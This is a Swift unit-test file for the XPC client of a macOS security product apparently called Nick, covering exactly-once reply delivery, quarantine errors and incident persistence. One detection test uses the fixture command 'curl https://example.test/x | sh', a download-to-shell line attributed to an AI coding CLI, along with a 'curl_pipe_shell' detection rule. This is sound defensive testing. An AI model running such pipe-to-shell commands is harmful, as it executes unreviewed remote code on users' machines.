import XCTest
@testable import Nick

final class ExtensionXPCClientIncidentTests: XCTestCase {
    @MainActor
    func testMainActorOneShotAcceptsBackgroundXPCRepliesExactlyOnce() async {
        let completed = expectation(description: "main actor completion")
        var values: [Bool] = []
        let reply = MainActorOneShot<Bool> { value in
            XCTAssertTrue(Thread.isMainThread)
            values.append(value)
            completed.fulfill()
        }

        DispatchQueue.global(qos: .userInitiated).async {
            XCTAssertTrue(reply.resolve(true))
            XCTAssertFalse(reply.resolve(false))
        }

        await fulfillment(of: [completed], timeout: 1)
        XCTAssertEqual(values, [true])
    }

    @MainActor
    func testEveryExtensionProtocolReplyShapeCanArriveOnBackgroundQueue() async {
        // Keep this list aligned with every reply-bearing call made by
        // ExtensionXPCClient. The payload is immaterial here: all callbacks
        // cross the same nonisolated, Sendable, exactly-once boundary before
        // touching MainActor state.
        let methods = [
            "getStatus", "installThreatIntelligenceBundle", "getExtensionHealth",
            "ingestAppObservedProtectionGap", "getPendingFIMViolations",
            "migrateSecuritySettings", "replaceSecuritySettings", "getIncidentStore",
            "migrateIncidentStore", "replaceIncidentStore", "validateIncidentVerdictTarget",
            "requestUpdateLease", "recordAuthorizedProtectionStop",
            "recordIntentionalAppExit", "getPersistedEvents", "requestQuarantineFile",
            "requestAllowFileOnce", "requestBlockReviewedFile", "requestRebuildFIMBaseline",
            "acknowledgeFIMViolation", "requestDeployCanaries",
            "requestRestoreQuarantinedFile", "debugValidateProtectionAuthorization",
            "requestDeleteQuarantinedFile", "registerStorageOperation",
            "completeStorageOperation"
        ]
        let completed = methods.map { expectation(description: $0) }
        var delivered: [String] = []

        for (index, method) in methods.enumerated() {
            let reply = MainActorOneShot<String> { value in
                XCTAssertTrue(Thread.isMainThread)
                delivered.append(value)
                completed[index].fulfill()
            }
            DispatchQueue.global(qos: .userInitiated).async {
                XCTAssertTrue(reply.resolve(method))
                XCTAssertFalse(reply.resolve("duplicate-\(method)"))
            }
        }

        await fulfillment(of: completed, timeout: 2)
        XCTAssertEqual(Set(delivered), Set(methods))
    }

    func testOneShotDataReplyCompletesOnlyOnceAcrossReplyErrorAndTimeout() {
        let recorder = LockedDataRecorder()
        let reply = OneShotDataReply { data in
            recorder.append(data)
        }

        XCTAssertTrue(reply.resolve(Data("reply".utf8)))
        XCTAssertFalse(reply.resolve(Data("error".utf8)))
        XCTAssertFalse(reply.resolve(Data("timeout".utf8)))
        XCTAssertEqual(recorder.values(), [Data("reply".utf8)])
    }

#if DEBUG
    @MainActor
    func test_establishedConnectionLossSchedulesReconnectAfterBootstrap() {
        let client = ExtensionXPCClient()

        client.simulateEstablishedConnectionLossForTesting(previousAttempts: 20)

        XCTAssertTrue(client.reconnectScheduledForTesting)
        XCTAssertFalse(client.isConnected)
        client.disconnect()
    }

    @MainActor
    func testDisconnectResumesIncidentPersistenceWaiterExactlyOnce() async {
        let client = ExtensionXPCClient()
        client.registerIncidentWriteGenerationForTesting(1)
        let waiter = Task { @MainActor in
            await client.awaitIncidentStorePersistenceForTesting(generation: 1)
        }
        await Task.yield()
        XCTAssertEqual(client.pendingIncidentWriteWaiterCount, 1)

        client.disconnect()

        let result = await waiter.value
        XCTAssertEqual(result.0, 1)
        XCTAssertFalse(result.1)
        XCTAssertEqual(client.pendingIncidentWriteWaiterCount, 0)
    }
#endif

    func test_platformShellBehaviorUsesAppleSigningAndHasNoFileEvidence() throws {
        let event = ESEvent(
            eventType: .authExec,
            processPath: "/Applications/ChatGPT.app/Contents/Resources/codex-cli/CodexCLI",
            pid: 1_842,
            parentPid: 1_060,
            filePath: "/bin/zsh",
            decision: .allow,
            threat: .init(
                threatName: "Download-to-shell command detected",
                threatFamily: "lolbin-behavior",
                isCodeSigned: true,
                metadata: [
                    "reason": "curl_pipe_shell",
                    "rule": "curl_pipe_shell",
                    "detectionKind": "lolbin-behavior",
                    "signalSeverity": "critical",
                    "execTargetPath": "/bin/zsh",
                    "matchedCommand": "curl https://example.test/x | sh",
                    "responsibleAppName": "ChatGPT",
                    "responsibleAppBundleID": "com.openai.chat",
                    "responsibleAppTeamID": "2DC432GLL2",
                    "responsibleAppSigning": "Signed",
                    "responsibleChain": "ChatGPT → Codex CLI → zsh"
                ]
            )
        )

        let finding = try XCTUnwrap(ExtensionFinding(event: event))

        XCTAssertEqual(
            finding.signal.processInfo?.signingStatus,
            .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh")
        )
        XCTAssertNil(finding.signal.fileInfo)
        XCTAssertEqual(finding.signal.metadata["matchedCommand"], "curl https://example.test/x | sh")
        XCTAssertEqual(finding.signal.metadata["responsibleAppName"], "ChatGPT")
        XCTAssertEqual(
            finding.signal.description,
            "Nick saw a shell run a script supplied by a download command."
        )
    }
#if DEBUG
    @MainActor
    func test_debugAuthorizationHarnessReportsDisconnectedAsUnavailableNotPassed() async {
        let client = ExtensionXPCClient()
        let completed = expectation(description: "debug authorization harness result")

        client.debugSendNeverAuthorizedProtectionCall { result in
            XCTAssertEqual(result, .unavailable("Real-Time Protection is not connected"))
            XCTAssertFalse(result.passed)
            XCTAssertTrue(result.statusText.hasPrefix("UNAVAILABLE:"))
            completed.fulfill()
        }

        await fulfillment(of: [completed], timeout: 1)
    }

    func test_debugAuthorizationHarnessStatusDistinguishesRefusalFromAcceptance() {
        XCTAssertTrue(DebugAuthorizationHarnessResult.refused.passed)
        XCTAssertEqual(
            DebugAuthorizationHarnessResult.refused.statusText,
            "Passed: the unapproved form was refused"
        )
        XCTAssertFalse(DebugAuthorizationHarnessResult.unexpectedlyAccepted.passed)
        XCTAssertEqual(
            DebugAuthorizationHarnessResult.unexpectedlyAccepted.statusText,
            "FAILED: the unapproved form was accepted"
        )
    }
#endif

    @MainActor
    func test_preStoreThreatWaitsThenDeliversAndAcknowledgesExactlyOnce() async throws {
        let client = ExtensionXPCClient()
        var storeReady = false
        var ingestCount = 0
        client.findingHandler = { _ in
            ingestCount += 1
            return .persisted(7)
        }
        client.incidentPersistenceOverride = { generation in (generation, true) }
        var acknowledged: [UUID] = []
        let acknowledgedOnce = expectation(description: "durable threat acknowledged")
        client.threatAcknowledgementOverride = { id in
            acknowledged.append(id)
            acknowledgedOnce.fulfill()
        }
        let event = IncidentStorePersistenceTests.tamperEvent(operation: .unlink)
        let persisted = PersistedExtensionFinding(
            kind: .threat,
            payload: try JSONEncoder().encode(event)
        )

        let beforeReady = await client.receivePersisted(persisted)
        XCTAssertNil(beforeReady)
        XCTAssertEqual(ingestCount, 0)
        XCTAssertTrue(acknowledged.isEmpty)
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)

        // An unset readiness provider fails closed and leaves the journal item
        // untouched.
        client.incidentStoreDidBecomeReady()
        await Task.yield()
        XCTAssertEqual(ingestCount, 0)
        XCTAssertTrue(acknowledged.isEmpty)

        client.incidentStoreReadyProvider = { storeReady }
        storeReady = true
        client.incidentStoreDidBecomeReady()
        await fulfillment(of: [acknowledgedOnce], timeout: 2)
        XCTAssertEqual(ingestCount, 1)
        XCTAssertEqual(acknowledged, [event.id])
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)

        // Journal replay of the same UUID is acknowledged without re-ingest.
        let replay = await client.receivePersisted(persisted)
        XCTAssertEqual(replay, event.id)
        XCTAssertEqual(ingestCount, 1)
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)
    }

    @MainActor
    func test_preStoreFIMAcknowledgementIsAppliedOnceWhenStoreBecomesReady() {
        let client = ExtensionXPCClient()
        let id = UUID()
        var storeReady = false
        var applied: [UUID] = []
        client.integrityAcknowledgementHandler = { applied.append($0) }

        client.applyOrDeferIntegrityAcknowledgement(id)
        client.applyOrDeferIntegrityAcknowledgement(id)
        client.incidentStoreDidBecomeReady()
        XCTAssertTrue(applied.isEmpty)

        client.incidentStoreReadyProvider = { storeReady }
        client.incidentStoreDidBecomeReady()
        XCTAssertTrue(applied.isEmpty)

        storeReady = true
        client.incidentStoreDidBecomeReady()
        XCTAssertEqual(applied, [id])

        client.incidentStoreDidBecomeReady()
        XCTAssertEqual(applied, [id])
    }

    @MainActor
    func test_disconnectedManualQuarantineUsesProtectionDisconnectedWording() async {
        let client = ExtensionXPCClient()
        let completed = expectation(description: "quarantine reply")

        client.requestQuarantineFile(path: "/tmp/eicar.com", expectedThreatName: "EICAR") { result in
            guard case .failure(let failure) = result else {
                XCTFail("Expected disconnected quarantine to fail")
                completed.fulfill()
                return
            }
            XCTAssertEqual(failure.reason, .protectionDisconnected)
            XCTAssertEqual(failure.statusLine, "Real-Time Protection is not connected")
            XCTAssertEqual(
                failure.guidance,
                "Open Settings and reconnect Real-Time Protection, then retry quarantine."
            )
            XCTAssertFalse(failure.statusLine.contains("NickExtensionXPC"))
            completed.fulfill()
        }

        await fulfillment(of: [completed], timeout: 1)
    }

    func test_unstructuredQuarantineReplyPreservesServiceMessage() {
        let failure = ExtensionXPCClient.unstructuredQuarantineFailure(
            message: "Nick re-scanned the file and could not confirm the detection. The file was not moved."
        )

        XCTAssertEqual(
            failure.statusLine,
            "Nick re-scanned the file and could not confirm the detection. The file was not moved."
        )
        XCTAssertNotEqual(failure.reason, .protectionDisconnected)
    }

    @MainActor
    func test_automaticEROFSUsesSharedWordingAndNotifiesOnce() throws {
        let failure = QuarantineFailure(
            reason: .readOnlyVolume,
            errorDomain: NSPOSIXErrorDomain,
            errorCode: Int(EROFS),
            volumeName: "NickReadOnly"
        )
        let report = RemediationReport(
            timestamp: Date(timeIntervalSince1970: 123),
            threatPath: "/Volumes/NickReadOnly/eicar.com",
            threatName: "EICAR Anti-Malware Test File",
            quarantineRecord: nil,
            actions: [RemediationAction(
                type: .quarantineFile,
                target: "/Volumes/NickReadOnly/eicar.com",
                success: false,
                detail: failure.statusLine,
                quarantineFailure: failure
            )]
        )
        let finding = ExtensionFinding(report: report)
        XCTAssertEqual(finding.signal.title, "EICAR Anti-Malware Test File")
        XCTAssertEqual(finding.signal.metadata["remediationStatusLine"], failure.statusLine)
        XCTAssertEqual(finding.recommendedAction, failure.guidance)

        let store = IncidentStore(persistOnInit: false)
        let alert = ThreatAlert(
            score: finding.score,
            content: AlertContent(
                title: finding.signal.title, description: finding.signal.description,
                severity: finding.signal.severity, recommendedAction: finding.recommendedAction
            ),
            contributingSignals: [finding.signal], timestamp: finding.signal.timestamp
        )
        let result = store.ingest([alert])
        XCTAssertEqual(result.newlyActionable.count, 1)
        XCTAssertEqual(store.incidents.first?.actions.last?.action, .quarantineFailed)
        XCTAssertEqual(store.ingest([alert]).newlyActionable.count, 0)
    }

    @MainActor
    func test_failedRootWriteRedeliveryUsesRealStoreAndAcksOnlyRetryGeneration() async throws {
        let client = ExtensionXPCClient()
        client.incidentStoreReadyProvider = { true }
        let store = IncidentStore(persistOnInit: false)
        let snapshot = try JSONEncoder().encode(IncidentStoreSnapshot(
            incidents: [], dismissalTombstones: [], expectedCooldowns: [:]
        ))
        try store.installPrivilegedSnapshot(snapshot) { _, _ in
            // This in-memory store test does not need an external persistence sink.
        }
        client.findingHandler = { finding in
            let alert = ThreatAlert(
                score: finding.score,
                content: AlertContent(
                    title: finding.signal.title, description: finding.signal.description,
                    severity: finding.signal.severity, recommendedAction: finding.recommendedAction
                ),
                contributingSignals: [finding.signal], timestamp: finding.signal.timestamp
            )
            return store.ingest([alert]).outcomes.first ?? .failed
        }
        var attempts = 0
        client.incidentPersistenceOverride = { generation in
            attempts += 1
            guard attempts > 1 else { return (generation, false) }
            store.confirmDurablePersistence(generation: generation)
            return (generation, true)
        }
        let event = IncidentStorePersistenceTests.tamperEvent(operation: .unlink)
        let persisted = PersistedExtensionFinding(kind: .threat, payload: try JSONEncoder().encode(event))

        let first = await client.receivePersisted(persisted)
        XCTAssertNil(first)
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)
        XCTAssertTrue(store.hasUnconfirmedChanges)

        let retry = await client.receivePersisted(persisted)
        XCTAssertEqual(retry, event.id)
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)
        XCTAssertFalse(store.hasUnconfirmedChanges)
        XCTAssertEqual(store.incidents.first?.alert.occurrenceCount, 1)
    }

    @MainActor
    func test_persistedLOLBinExecUsesRealIngestPathAndDurablyAcknowledgesOnce() async throws {
        let client = ExtensionXPCClient()
        client.incidentStoreReadyProvider = { true }
        let store = IncidentStore(persistOnInit: false)
        let snapshot = try JSONEncoder().encode(IncidentStoreSnapshot(
            incidents: [], dismissalTombstones: [], expectedCooldowns: [:]
        ))
        try store.installPrivilegedSnapshot(snapshot) { _, _ in
            // This in-memory store test does not need an external persistence sink.
        }
        client.findingHandler = { finding in
            let alert = ThreatAlert(
                id: finding.signal.id,
                score: finding.score,
                content: AlertContent(
                    title: finding.signal.title,
                    description: finding.signal.description,
                    severity: finding.signal.severity,
                    recommendedAction: finding.recommendedAction
                ),
                contributingSignals: [finding.signal],
                timestamp: finding.signal.timestamp
            )
            return store.ingest([alert]).outcomes.first ?? .failed
        }
        client.incidentPersistenceOverride = { generation in
            store.confirmDurablePersistence(generation: generation)
            return (generation, true)
        }
        let event = LOLBinTestFixtures.curlPipeEvent(pid: 421)
        let persisted = PersistedExtensionFinding(kind: .threat, payload: try JSONEncoder().encode(event))

        let firstDelivery = await client.receivePersisted(persisted)
        XCTAssertEqual(firstDelivery, event.id)
        let incident = try XCTUnwrap(store.incidents.first)
        XCTAssertTrue(incident.alert.hasProtectedEvidence)
        XCTAssertEqual(incident.alert.severity, .critical)
        XCTAssertEqual(
            UserFacingAlertBuilder.shared.build(from: incident.alert).headline,
            "Download-to-shell command detected"
        )
        let replayDelivery = await client.receivePersisted(persisted)
        XCTAssertEqual(replayDelivery, event.id)
        XCTAssertEqual(store.incidents.count, 1)
        XCTAssertEqual(store.incidents.first?.alert.occurrenceCount, 1)
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)
    }

    @MainActor
    func test_suppressedDismissalAcksAndCountsWithoutPersistenceWait() async throws {
        let client = ExtensionXPCClient()
        client.incidentStoreReadyProvider = { true }
        client.findingHandler = { _ in .suppressedByPolicy("dismissal") }
        client.incidentPersistenceOverride = { _ in XCTFail("suppression must not await a write"); return nil }
        let event = IncidentStorePersistenceTests.tamperEvent(operation: .unlink)
        let persisted = PersistedExtensionFinding(kind: .threat, payload: try JSONEncoder().encode(event))

        let result = await client.receivePersisted(persisted)
        XCTAssertEqual(result, event.id)
        XCTAssertEqual(client.suppressedByDismissalCount, 1)
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)
    }

    @MainActor
    func test_persistedOutcomeCannotAckFromDifferentGeneration() async throws {
        let client = ExtensionXPCClient()
        client.incidentStoreReadyProvider = { true }
        client.findingHandler = { _ in .coalesced(7) }
        client.incidentPersistenceOverride = { _ in (8, true) }
        let event = IncidentStorePersistenceTests.tamperEvent(operation: .openWrite)
        let persisted = PersistedExtensionFinding(kind: .threat, payload: try JSONEncoder().encode(event))

        let result = await client.receivePersisted(persisted)
        XCTAssertNil(result)
        XCTAssertTrue(client.failedThreatEventIDs.contains(event.id))
        XCTAssertEqual(client.ackWithoutPersistenceCount, 0)
    }

}

private final class LockedDataRecorder: @unchecked Sendable {
    private let lock = NSLock()
    private var recorded: [Data] = []

    func append(_ data: Data) {
        lock.withLock { recorded.append(data) }
    }

    func values() -> [Data] {
        lock.withLock { recorded }
    }
}
